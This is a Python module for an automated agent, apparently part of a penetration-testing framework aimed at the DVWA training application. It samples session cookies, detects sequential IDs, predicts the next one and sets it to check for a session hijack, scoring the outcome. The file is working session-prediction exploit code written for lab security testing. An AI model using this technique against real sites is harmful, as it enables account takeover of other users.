"""Tier 2 weak session IDs agent."""

from __future__ import annotations

import re
from typing import Any

from agents.base_agent import BaseAgent
from agents.state_utils import (
    already_tried_payloads,
    append_error_marker,
    make_update,
    module_endpoint,
    normalize_security_level,
    prepare_agent_session,
)
from core.state import ExploitationState
from foundation.http_client import RequestTimeoutError, TransportError
from foundation.session_manager import DVWASession
from foundation.verifier import Verifier


SESSION_RE = re.compile(r"dvwaSession=([^;\s]+)", re.IGNORECASE)
HIJACK_CONTEXT_SIGNALS = [
    "welcome",
    "logout",
    "password protected area",
    "account",
    "admin",
]


class WeakSessionAgent(BaseAgent):
    module_name = "weak_session"

    def __init__(self) -> None:
        self.verifier = Verifier()

    def check_prerequisites(self, state: ExploitationState) -> bool:
        return True

    @staticmethod
    def _extract_session_id(headers: Any) -> str | None:
        if headers is None:
            return None
        header_value = ""
        if hasattr(headers, "get"):
            header_value = headers.get("set-cookie", "") or headers.get("Set-Cookie", "")
        match = SESSION_RE.search(str(header_value))
        return match.group(1) if match else None

    @staticmethod
    def _is_sequential(values: list[str]) -> bool:
        if len(values) < 2 or not all(value.isdigit() for value in values):
            return False
        ints = [int(value) for value in values]
        return all(b - a == 1 for a, b in zip(ints, ints[1:]))

    def run(self, state: ExploitationState) -> dict[str, Any]:
        target_url = state.get("target_url", "")
        level = normalize_security_level(state.get("security_level"))
        endpoint = module_endpoint(state, self.module_name, "/vulnerabilities/weak_id/")
        already_tried = already_tried_payloads(state, self.module_name)

        score = 0
        confirmed: list[str] = []
        outcomes: list[str] = []
        tried_now: list[str] = []

        if not target_url:
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        session_values: list[str] = []
        session = DVWASession(target_url)
        try:
            ready, prep_notes = prepare_agent_session(session, level, require_login=True)
            tried_now.extend(prep_notes)
            if not ready:
                return make_update(
                    state=state,
                    module_name=self.module_name,
                    score=score,
                    tried_payloads=tried_now,
                )

            for i in range(3):
                marker = f"sample_{i}"
                if marker in already_tried:
                    continue
                tried_now.append(marker)
                response = session.get(endpoint)
                session_id = self._extract_session_id(getattr(response, "headers", None))
                if session_id:
                    session_values.append(session_id)

            refresh_index = 0
            while len(session_values) < 2 and refresh_index < 3:
                marker = f"sample_refresh_{refresh_index}"
                refresh_index += 1
                if marker in already_tried:
                    continue
                tried_now.append(marker)
                response = session.get(endpoint)
                session_id = self._extract_session_id(getattr(response, "headers", None))
                if session_id:
                    session_values.append(session_id)

            if self._is_sequential(session_values):
                score = max(score, 1)
                confirmed.append("weak_session_confirmed")

                predicted = str(int(session_values[-1]) + 1)
                prediction_marker = f"predict:{predicted}"
                if prediction_marker in already_tried:
                    return make_update(
                        state=state,
                        module_name=self.module_name,
                        score=score,
                        tried_payloads=tried_now,
                        confirmed_vulns=confirmed,
                        achieved_outcomes=outcomes,
                    )

                tried_now.append(prediction_marker)
                session.http.set_cookie("dvwaSession", predicted)
                verify = session.get(endpoint)
                verify_body = (verify.text or "").lower()
                returned_id = self._extract_session_id(getattr(verify, "headers", None))
                has_hijack_context = self.verifier.contains_any(
                    verify_body,
                    HIJACK_CONTEXT_SIGNALS,
                ).ok

                if returned_id == predicted and has_hijack_context:
                    score = max(score, 3)
                    if "session_hijack" not in confirmed:
                        confirmed.append("session_hijack")
                    outcomes.append("session_hijack")
                if returned_id == predicted and has_hijack_context and "admin" in verify_body:
                    score = 4
        except (TransportError, RequestTimeoutError, RuntimeError, ValueError) as exc:
            append_error_marker(tried_now, "weak_session_runtime_error", exc)
        finally:
            session.close()

        return make_update(
            state=state,
            module_name=self.module_name,
            score=score,
            tried_payloads=tried_now,
            confirmed_vulns=confirmed,
            achieved_outcomes=outcomes,
        )


_AGENT = WeakSessionAgent()


def weak_session_agent(state: ExploitationState) -> dict[str, Any]:
    return _AGENT.run(state)
